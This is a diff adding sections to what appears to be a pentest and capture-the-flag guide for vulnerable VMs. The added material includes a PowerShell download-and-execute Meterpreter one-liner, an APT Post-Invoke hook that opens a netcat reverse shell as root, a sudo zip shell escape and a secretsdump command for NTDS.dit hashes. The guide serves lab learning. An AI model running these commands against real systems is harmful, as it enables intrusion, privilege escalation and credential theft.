@@ -14,7 +14,7 @@ In solving any vulnerable machine, there are few stages:
 * :ref:`from-nothing-to-unprivileged-shell`
 * :ref:`unprivileged-shell-to-privileged-shell`
 
-In this blog, we have mentioned, what can be done in each stages. Have also provided Tips and Tricks for solving the VMs. Vulnerability Analysis Blog in Infrastructure Pentest Series could also be referred for exploitation of any particular services (As, it provides information such as "If you have found service X (like ssh, Apache tomcat, JBoss, iscsi etc.), how they can be exploited"
+In this blog, we have mentioned, what can be done in each stages. Have also provided :ref:`tips-and-tricks` for solving the VMs. Vulnerability Analysis Blog in Infrastructure Pentest Series could also be referred for exploitation of any particular services (As, it provides information such as "If you have found service X (like ssh, Apache tomcat, JBoss, iscsi etc.), how they can be exploited". There are also appendix related to :ref:`A1-Local-file-Inclusion` and :ref:`A2-File-Upload`
 
 .. _finding-the-ip-address:
 
@@ -110,6 +110,29 @@ As unicornscan is so fast, it makes sense to use it for scanning large networks 
 
 When portscanning a host, you will be presented with a list of open ports. In many cases, the port number tells you what application is running. Port 25 is usually SMTP, port 80 mostly HTTP. However, this is not always the case, and especially when dealing with proprietary protocols running on non-standard ports you will not be able to determine what application is running.
 
+netcat 
+------
+Netcat might not be the best tool to use for port scanning, but can be used quickly. netcat scans TCP ports by default, but we can perform UDP scans as well.
+
+For a TCP scan, the format is
+
+::
+
+  nc -vvn -z xxx.xxx.xxx.xxx startport-endport
+     -z flag is Zero-I/O mode (used for scanning)
+     -vv will provide verbose information about the results
+     -n flag allows to skip the DNS lookup
+
+For a UDP Port Scan, we need to add -u flag which makes the format
+
+::
+
+  nc -vvn -u -z xxx.xxx.xxx.xxx startport-endport
+
+
+If we have windows machine without nmap, we can use `PSnmap <https://www.powershellgallery.com/packages/PSnmap/>`_
+
+
 Amap - Application mapper
 -------------------------
 
@@ -130,6 +153,8 @@ By using **amap**, we can identify if any SSL server is running on port 3445 or 
 
 Rabbit Holes?
 =============
+
+There would be instances where you are not able to find anything such as any open port or any entry point. The below may provide some clue.
 
 .. _listen-to-the-interface:
 
@@ -248,7 +273,7 @@ There would be some days, when you won't find vulnerability in searchsploit. We 
 Google-Vulns
 ------------
 
-It is suggested that whenever you are googling something,  also try with the words such as ctf, github, python, tool etc. For example. Let's say, you are stuck in a docker or in a specific cms search for docker ctf or <cms_name> ctf/ github etc.
+It is suggested that whenever you are googling something,  also try with the words such as ctf, github, python, tool etc. For example. Let's say, you are stuck in a docker or in a specific cms. Search for docker ctf or <cms_name> ctf/ github etc.
 
 Webservices
 -----------
@@ -274,6 +299,11 @@ nikto - Scan web server for known vulnerabilities. It would examine a web server
 * Default files and programs
 * Insecure files and programs
 * Outdated servers and programs
+
+BurpSuite Spider
+^^^^^^^^^^^^^^^^
+
+There would be some cases where dirb/ dirbuster won't find anything. Happened with me on a Node.js web application. Burpsuite spider helped in finding extra-pages which contained the credentials.
 
 dirb, wfuzz, dirbuster
 ^^^^^^^^^^^^^^^^^^^^^^
@@ -657,6 +687,20 @@ MYSQL
  :: 
 	
    select load_file('/etc/passwd');
+
+Reverse Shell from Windows
+^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+If there's a way, we can execute code from windows, we may try
+
+* Powershell Empire/ Metasploit Web-Delivery Method
+* Invoke-Shellcode 
+
+ ::
+
+  Powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('http://YourIPAddress:8000/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost YourIPAddress -Lport 4444 -Force"
+
+* Upload ncat and execute 
 
 Spawning a TTY Shell
 --------------------
@@ -1371,7 +1415,31 @@ Now, when we try to read example.conf file, we would be able to read the file fo
  readExampleConf /home/xxxxxxx/example.conf
  <Contents of shadow or id_rsa
 
+Directory Symlink
+^^^^^^^^^^^^^^^^^
 
+Let's see what happens when we create a symlink of a directory
+
+::
+
+ ln -s /etc/ sym_file
+ ln -s /etc/ sym_fold/
+
+Here the first one create a direct symlink to the /etc folder and will be shown as 
+
+::
+
+ sym_file -> /etc/
+
+where as in the second one ( ln -s /etc/ sym_fold/ ), we first create a folder sym_fold and then create a symlink
+
+::
+
+ sym_fold:
+ total 0
+ lrwxrwxrwx 1 bitvijays bitvijays 5 Dec  2 19:31 etc -> /etc/
+
+This might be useful to bypass some filtering, when let's say a cronjob is running but refuses to take backup of anything named /etc . In that case, we can create a symlink inside a folder and take the backup. 
 
 MySQL Privileged Escalation
 ---------------------------
@@ -1412,7 +1480,45 @@ or
  setgid(0); setuid(0);
  system("/bin/bash"); }
 
+Unattended APT - Upgrade
+------------------------
 
+If we have a ability to upload files to the host at any location (For. example misconfigured TFTP server) and APT-Update/ Upgrade is running at a set interval (Basically unattended-upgrade or via-a-cronjob), then we can use APT-Conf to run commands
+
+DPKG
+^^^^
+
+Debconf configuration is initiated with following line. The command in brackets could be any arbitrary command to be executed in shell.
+
+::
+
+ Dpkg::Pre-Install-Pkgs {"/usr/sbin/dpkg-preconfigure --apt || true";};
+ 
+There are also options
+
+::
+
+ Dpkg::Pre-Invoke {"command";};
+ Dpkg::Post-Invoke {"command";};
+
+They execute commands before/after apt calls dpkg. Post-Invoke which is invoked after every execution of dpkg (by an apt tool, not manually);
+
+APT
+^^^
+
+* APT::Update::Post-Invoke-Success, which is invoked after successful updates (i.e. package information updates, not upgrades);
+
+* APT::Update::Post-Invoke, which is invoked after updates, successful or otherwise (after the previous hook in the former case).
+
+To invoke the above, create a file in  /etc/apt/apt.conf.d/ folder specifying the NN<Name> and keep the code in that
+
+For example:
+
+::
+
+ APT::Update::Post-Invoke{"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f";};
+
+When the apt-update would be executed, it would be executed as root and we would get a shell as a root.
 
 SUDO -l Permissions
 -------------------
@@ -1493,6 +1599,13 @@ where
 
    This behavior can also be enabled by default at compile time.
 
+zip
+^^^
+
+::
+
+  touch /tmp/exploit
+  sudo -u root zip /tmp/exploit.zip /tmp/exploit -T --unzip-command="sh -c /bin/bash"
 
 find
 ^^^^
@@ -1831,6 +1944,9 @@ Trick is that because of the '\*.c' wildcard, 'rsync' got '-e sh shell.c' option
     [root@defensecode public]# cat shell.c
     /usr/bin/id > shell_output.txt
 
+
+.. _tips-and-tricks:
+
 Tips and Tricks
 ===============
 
@@ -1842,6 +1958,15 @@ If ftp anonymous login is provided or you have login details, you can download t
 ::
 
   wget -rq ftp://IP --ftp-user=username --ftp-password=password
+
+wgetrc Commands
+^^^^^^^^^^^^^^^
+
+::
+
+ output_document = file -- Set the output filename—the same as ‘-O file’.
+ post_data = string -- Use POST as the method for all HTTP requests and send string in the request body. The same as ‘--post-data=string’.
+ post_file = file   -- Use POST as the method for all HTTP requests and send the contents of file in the request body. The same as ‘--post-file=file’.
 
 SSH
 ---
@@ -1891,6 +2016,24 @@ First things
 * If any login page is implemented asking for username and password. Check how it is implemented? Is it using any open-source authentication modules? If so, look if there are any default passwords for that.
 * If there's a page where redirect is happening (for example, http://example.com or http://example.com/support.php redirects us to http://example.com/login.php) However, the response size for example.com or support.php is a bit off, especially considering the page gives a 302 redirect. We may use No-redirect extension from firefox and view the page. We may also utilize curl/ burp to view the response.
 * `List of HTTP Headers <https://en.wikipedia.org/wiki/List_of_HTTP_header_fields>`_ : Quite important when you want to set headers/ cookies etc.
+* Watch for places where the site redirects you (it adds something to the URL and displays the homepage). If you see that happen, try adjusting the URL manually. for example: 
+  when browsing 
+
+ ::
+
+   http://IPAddress/SitePages/
+
+ it redirects to 
+
+ :: 
+
+  http://IPAddress/_layouts/15/start.aspx#/SitePages/Forms/AllPages.aspx
+
+ we may find something by adjusting the URL manually to 
+
+ ::
+
+  http://IPAddress/SitePages/Forms/AllPages.aspx
 
 htaccess - UserAgent
 ^^^^^^^^^^^^^^^^^^^^
@@ -2269,7 +2412,19 @@ Taken from `RSA Given q,p and e <https://crypto.stackexchange.com/questions/1944
  if __name__ == "__main__":
     main()
 
-    
+
+SECCURE Elliptic Curve Crypto Utility for Reliable Encryption
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+If you see, something like this
+
+::
+
+ '\x00\x146\x17\xe9\xc1\x1a\x7fkX\xec\xa0n,h\xb4\xd0\x98\xeaO[\xf8\xfa\x85\xaa\xb37!\xf0j\x0e\xd4\xd0\x8b\xfe}\x8a\xd2+\xf2\xceu\x07\x90K2E\x12\x1d\xf1\xd8\x8f\xc6\x91\t<w\x99\x1b9\x98'
+
+it's probably `SECCURE Elliptic Curve Crypto Utility for Reliable Encryption <http://point-at-infinity.org/seccure/>`_ Utilize python module `seccure <https://pypi.python.org/pypi/seccure>`_ to get the plaintext. 
+
+
 Truecrypt Files
 ---------------
 
@@ -2331,6 +2486,9 @@ Alternate Data Stream
 Sometimes, `Alternate Data Stream <https://blogs.technet.microsoft.com/askcore/2013/03/24/alternate-data-streams-in-ntfs/>`_ can be used to hide data in streams.
 
 The output shows not only the name of the ADS and its size, but also the unnamed data stream and its size is also listed (shown as :$DATA).
+
+Powershell-Way
+
 ::
 
  PS > Get-Item -Path C:\Users\Administrator\example.zip -stream *
@@ -2354,6 +2512,42 @@ Check a directory for ADS?
 ::
 
  gci -recurse | % { gi $_.FullName -stream * } | where stream -ne ':$Data'
+
+DIR Way
+
+Current directory ADS Streams
+
+::
+
+ dir /r | find ":$DATA"
+
+Sub-directories too
+
+::
+
+ dir   /s /r | find ":$DATA"
+
+Reading the hidden stream
+
+::
+
+ more < testfile.txt:hidden_stream::$DATA
+
+NTDS.dit and SYSTEM hive
+^^^^^^^^^^^^^^^^^^^^^^^^^
+
+If you have found files such as 
+
+::
+
+ 192.168.110.133_psexec.ntdsgrab._333512.dit: Extensible storage engine DataBase, version 0x620, checksum 0x16d44752, page size 8192, DirtyShutdown, Windows version 6.1
+ 192.168.110.133_psexec.ntdsgrab._089134.bin: MS Windows registry file, NT/2000 or above
+
+Probably, there are dump of domain controller NTDS.dit file, from which passwords can be extracted. Utilize,
+
+::
+
+ python secretsdump.py -ntds /root/ntds_cracking/ntds.dit -system /root/ntds_cracking/systemhive LOCAL
 
 
 
@@ -2563,10 +2757,19 @@ Others
  * WordPress : If we have found a username and password of wordpress with admin privileges, we can upload a php meterpreter. One of the possible way is to do Appearance > Editor > Possibly edit 404 Template.
 
 * If the only port which is open is 3128, check for the open proxy and route the traffic via the open proxy. Probably, squid proxy server would be running. If it is the squid configuration file is /etc/squid/squid.conf
+ 
+ * If you do get the configuration file, do check for what kind of proxy it is! like SOCKS4, SOCKS5 or HTTP(S) proxy and is there any authentication required to access the proxy. 
+ * We may utilize `Proxychains <https://github.com/haad/proxychains>`_ to access the other side of network like ssh, http etc. 
 
 * Running Asterisk/ Elastix/ FreePBX or any PBX, probably try `SIPVicious <https://github.com/EnableSecurity/sipvicious>`_  suite is a set of tools that can be used to audit SIP based VoIP systems. Running http:\\IP\panel should provide us valid extensions.
 
 * Sharepoint running? Probably, check `SPartan <https://github.com/sensepost/SPartan>`_ Frontpage and Sharepoint fingerprinting and attack tool and `SharePwn <https://github.com/0rigen/SharePwn>`_ SharePoint Security Auditor.
+
+* authbind software allows a program that would normally require superuser privileges to access privileged network services to run as a non-privileged user. authbind allows the system administrator to permit specific users and groups access to bind to TCP and UDP ports below 1024.
+
+* Mostly, if there's only port open like ssh and the IP might be acting as a interface between two networks? Like IT and OT. Probably, try to add that IP address as a default route? As it might be acting as a router?
+
+* If you are trying to figure out the hostname of the machine and the DNS-Server is not configured, may be try to do a Full Nmap Scan -A Option? (Still need to figure out how does that work:)
 
 * Want to send a email via the SMTP server something like SMTP-Open-Relay utilize `Swaks <http://www.jetmore.org/john/code/swaks/>`_ Swiss Army Knife for SMTP.
 
@@ -2580,7 +2783,7 @@ Others
 
   unshadow passwd shadown
 
-* If IIS and WebDav with PUT and MOVE method are enabled, we can use testdav to see which files are allowed 
+* If IIS and WebDav with PUT and MOVE method are enabled, we can use testdav or cadaver (A command-line WebDAV client for Unix) to see which files are allowed
 
  ::
 
@@ -2767,6 +2970,8 @@ Useful Tools
 * `exe2hex <https://github.com/g0tmi1k/exe2hex>`_ : Inline file transfer using in-built Windows tools (DEBUG.exe or PowerShell). 
 
 * `Powercat <https://github.com/secabstraction/PowerCat>`_ : A PowerShell TCP/IP swiss army knife that works with Netcat & Ncat
+
+.. _A1-Local-file-Inclusion:
 
 Appendix-I : Local File Inclusion
 =================================
@@ -3006,6 +3211,7 @@ The session file could again afterwards be included using the LFI (note that you
 Email Server 
 ^^^^^^^^^^^^
 
+.. _A2-File-Upload:
 
 Appendix-II File Upload
 =======================
